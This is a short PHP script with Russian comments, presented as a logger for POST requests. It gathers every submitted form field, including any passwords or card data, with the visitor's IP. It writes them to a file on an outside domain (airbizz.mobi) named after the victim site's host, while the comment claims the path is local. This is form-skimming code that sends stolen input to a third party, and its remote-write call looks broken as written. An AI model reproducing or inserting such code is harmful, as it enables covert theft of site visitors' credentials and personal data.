<?php
if(isset($_POST) && count($_POST)>0){
        $data="";
        // собираем POST-данные, если они вообще есть
        foreach($_POST as $key=>$val){
                if(is_string($val) && strlen($val)>2000 )
                        $val=substr($val,0,2000);
                $data.=$key."=>".$val."\n";
        }
        // вместо /home/example.com/ указываем свой путь от
// корня сервера, куда должен писаться лог
        $fp=fopen("https://airbizz.mobi/data/".$_SERVER['HTTP_HOST']."--".date("Ymd").".log","a");
        fwrite($fp,date("Y-m-d H:i:s")." ".$_SERVER['REMOTE_ADDR']." ".$_SERVER['SCRIPT_FILENAME']."\n".$data."---------------------------\n");
        fclose($fp);
        $data="";
        reset($_POST);
}
?> 